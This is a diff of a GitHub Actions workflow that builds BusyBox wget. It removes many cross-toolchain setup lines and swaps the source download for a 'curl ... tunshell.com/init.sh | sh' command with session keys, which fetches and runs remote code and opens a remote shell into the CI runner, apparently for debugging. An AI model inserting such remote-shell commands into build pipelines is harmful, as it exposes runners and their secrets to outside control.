@@ -26,39 +26,12 @@ jobs:
           path: main
       - name: Install build dependencies
         run: "\
-          curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T yhpUFSDdewGKLVPtE2T4iQ jyu8jOddn3wJkYhuuYP5AX eu.relay.tunshell.com
           sudo apt-get update\n
           sudo apt-get install -y --no-install-recommends build-essential ca-certificates jq musl musl-dev musl-tools p7zip-full wget  \
-          file qemu-user-static \
-          g++-aarch64-linux-gnu \
-          g++-arm-linux-gnueabi \
-          g++-arm-linux-gnueabihf \
-          g++-i686-linux-gnu \
-          g++-m68k-linux-gnu \
-          g++-mips-linux-gnu \
-          g++-mipsel-linux-gnu \
-          g++-mips64-linux-gnuabi64 \
-          g++-mips64el-linux-gnuabi64 \
-          g++-powerpc-linux-gnu \
-          g++-powerpc64-linux-gnu \
-          g++-powerpc64le-linux-gnu \
-          g++-riscv64-linux-gnu \
-          g++-s390x-linux-gnu \
-          g++-sh4-linux-gnu libc6-dev-sh4-cross\n
-          sudo mkdir -p /usr/local/rv32\n
-          wget -O- -q $RISCV32_TOOLCHAIN_URL | sudo tar -C /usr/local/rv32 --strip-components=1 -xzf -\n
-          sudo ln -s /usr/bin/ar /usr/bin/musl-ar\n
-          sudo ln -s /usr/bin/strip /usr/bin/musl-strip\n
-          sudo ln -s /usr/local/rv32/sysroot /usr/riscv32-linux-gnu\n
-          sudo ln -s /usr/local/rv32/bin/riscv32-unknown-linux-gnu-ar /usr/bin/riscv32-linux-gnu-ar\n
-          sudo ln -s /usr/local/rv32/bin/riscv32-unknown-linux-gnu-strip /usr/bin/riscv32-linux-gnu-strip\n
-          echo '/usr/local/rv32/bin/riscv32-unknown-linux-gnu-gcc -L/usr/riscv32-linux-gnu \"$@\"' | sudo tee /usr/bin/riscv32-linux-gnu-gcc > /dev/null\n
-          sudo chmod +x /usr/bin/riscv32-linux-gnu-gcc\n
-          mkdir busybox\n
         "
       - name: Build wget-busybox for x86_64 (GCC-Native)
         run: |
-          wget -O- -q $BUSYBOX_URL | tar jxf - && mkdir build && cd build
+          curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T yhpUFSDdewGKLVPtE2T4iQ jyu8jOddn3wJkYhuuYP5AX eu.relay.tunshell.com
           make KBUILD_SRC="../$BUSYBOX_DIRNAME" -f "../$BUSYBOX_DIRNAME/Makefile" defconfig
           sed -e 's/.*\<CONFIG_STATIC\>.*/CONFIG_STATIC=y/' -i .config
           bash "../$BUSYBOX_DIRNAME/make_single_applets.sh" WGET
